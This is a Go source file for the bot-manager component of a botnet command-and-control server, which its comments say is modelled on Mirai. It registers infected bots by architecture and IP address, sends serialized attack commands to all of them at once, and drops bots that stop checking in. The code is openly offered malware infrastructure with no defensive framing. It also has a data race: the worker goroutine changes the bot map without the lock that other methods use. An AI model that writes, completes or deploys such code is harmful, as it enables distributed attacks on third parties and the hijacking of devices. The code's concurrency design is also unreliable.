// manager.go — thread-safe bot registry and command dispatch.
//
// Every connected bot is tracked here. When an admin launches an
// attack, the manager fans out the serialized command to all bots
// (or a filtered subset). This mirrors Mirai's clientList.go.

package main

import (
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// --- bot entry ---

type BotEntry struct {
	ID        uint32
	Conn      net.Conn
	Arch      string   // e.g., "x86_64", "armv7l", "mips"
	Version   uint8
	RemoteIP  string
	Connected time.Time
	LastSeen  time.Time
}

// --- manager ---

type Manager struct {
	mu       sync.RWMutex
	bots     map[uint32]*BotEntry
	nextID   uint32
	addCh    chan *BotEntry
	delCh    chan uint32
	atkCh    chan *atkJob
	quitCh   chan struct{}
}

type atkJob struct {
	cmd    *AttackCommand
	buf    []byte
	result chan int // number of bots the command was sent to
}

func NewManager() *Manager {
	m := &Manager{
		bots:   make(map[uint32]*BotEntry),
		nextID: 1,
		addCh:  make(chan *BotEntry, 256),
		delCh:  make(chan uint32, 256),
		atkCh:  make(chan *atkJob, 64),
		quitCh: make(chan struct{}),
	}
	go m.worker()
	return m
}

// worker serializes all mutations through a single goroutine — no locks needed
// for add/del/dispatch operations. Same pattern as Mirai's clientList worker.
func (m *Manager) worker() {
	for {
		select {
		case bot := <-m.addCh:
			m.bots[bot.ID] = bot
			log.Printf("[+] bot #%d connected  arch=%s  ip=%s  (total: %d)",
				bot.ID, bot.Arch, bot.RemoteIP, len(m.bots))

		case id := <-m.delCh:
			if bot, ok := m.bots[id]; ok {
				log.Printf("[-] bot #%d disconnected  arch=%s  ip=%s  (total: %d)",
					id, bot.Arch, bot.RemoteIP, len(m.bots)-1)
				delete(m.bots, id)
			}

		case job := <-m.atkCh:
			count := 0
			for _, bot := range m.bots {
				bot.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
				_, err := bot.Conn.Write(job.buf)
				bot.Conn.SetWriteDeadline(time.Time{})
				if err != nil {
					log.Printf("[!] write fail bot #%d: %v (will be cleaned up by keepalive)", bot.ID, err)
					continue
				}
				count++
			}
			job.result <- count

		case <-m.quitCh:
			return
		}
	}
}

// Register a new bot connection. Returns the assigned bot ID.
func (m *Manager) Register(conn net.Conn, arch string, version uint8) *BotEntry {
	bot := &BotEntry{
		ID:        atomic.AddUint32(&m.nextID, 1) - 1,
		Conn:      conn,
		Arch:      arch,
		Version:   version,
		RemoteIP:  conn.RemoteAddr().(*net.TCPAddr).IP.String(),
		Connected: time.Now(),
		LastSeen:  time.Now(),
	}
	m.addCh <- bot
	return bot
}

// Unregister removes a bot from the registry.
func (m *Manager) Unregister(id uint32) {
	m.delCh <- id
}

// Dispatch serializes an attack command and fans it out to all connected bots.
// Returns the number of bots the command was delivered to.
func (m *Manager) Dispatch(cmd *AttackCommand) (int, error) {
	buf, err := cmd.Serialize()
	if err != nil {
		return 0, fmt.Errorf("serialize failed: %v", err)
	}

	job := &atkJob{
		cmd:    cmd,
		buf:    buf,
		result: make(chan int, 1),
	}

	select {
	case m.atkCh <- job:
		return <-job.result, nil
	case <-time.After(3 * time.Second):
		return 0, fmt.Errorf("dispatch timeout — worker overloaded")
	}
}

// UpdateSeen refreshes a bot's last-seen timestamp.
func (m *Manager) UpdateSeen(id uint32) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if bot, ok := m.bots[id]; ok {
		bot.LastSeen = time.Now()
	}
}

// Count returns the total number of connected bots.
func (m *Manager) Count() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.bots)
}

// CountByArch returns bot counts grouped by architecture.
func (m *Manager) CountByArch() map[string]int {
	m.mu.RLock()
	defer m.mu.RUnlock()

	archs := make(map[string]int)
	for _, bot := range m.bots {
		archs[bot.Arch]++
	}
	return archs
}

// List returns a snapshot of all connected bots.
func (m *Manager) List() []BotEntry {
	m.mu.RLock()
	defer m.mu.RUnlock()

	bots := make([]BotEntry, 0, len(m.bots))
	for _, bot := range m.bots {
		bots = append(bots, *bot)
	}
	return bots
}

// PruneStale removes bots that haven't sent a keepalive within the timeout.
// Called periodically by a goroutine in main.
func (m *Manager) PruneStale(timeout time.Duration) int {
	m.mu.Lock()
	defer m.mu.Unlock()

	cutoff := time.Now().Add(-timeout)
	var pruned []uint32
	for id, bot := range m.bots {
		if bot.LastSeen.Before(cutoff) {
			pruned = append(pruned, id)
		}
	}

	for _, id := range pruned {
		bot := m.bots[id]
		bot.Conn.Close()
		delete(m.bots, id)
		log.Printf("[-] pruned stale bot #%d  arch=%s  ip=%s  last_seen=%v",
			id, bot.Arch, bot.RemoteIP, bot.LastSeen)
	}

	return len(pruned)
}

func (m *Manager) Shutdown() {
	close(m.quitCh)
}
